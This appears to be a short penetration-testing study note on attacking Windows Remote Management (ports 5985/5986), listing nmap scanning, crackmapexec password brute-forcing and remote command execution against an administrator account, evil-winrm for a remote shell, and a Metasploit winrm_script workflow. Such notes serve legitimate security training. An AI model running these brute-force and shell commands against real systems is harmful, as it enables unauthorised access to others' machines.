
# Exploiting WinRM
### WinRM
- Windows Remote Management Protocol
- Not ran by default
- Can be used to facilitate remote access with Windows systems over HTTP(S)
- TCP ports 5985 and 5986

### Exploiting WinRM
- Utility called **crackmapexec** for performing brute-force to identify users and their passwords
- to obtain the command shell we use **evil-winrm**
- **process**
	- `$ nmap -sV -p 5985 10.10.10.10`
	- `$ crackmapexec winrm 10.10.1.10 -u administrator -p <path to pass list>  `
	- `$ crackmapexec winrm 10.10.10.10 -u administrator -p password -x "whoami"`
	- `$ evil-winrm.rb -u administrator -p 'password' -i 10.10.10.10` - to get a command shell
- **Using Metasploit**
	- `$ service postgresql start && msfconsole`
	- `$ search winrm_script`
	- `$ use the exploit`
	-`$ set the options -ex: set FORCE_VBS true`
	- `$ exploit`
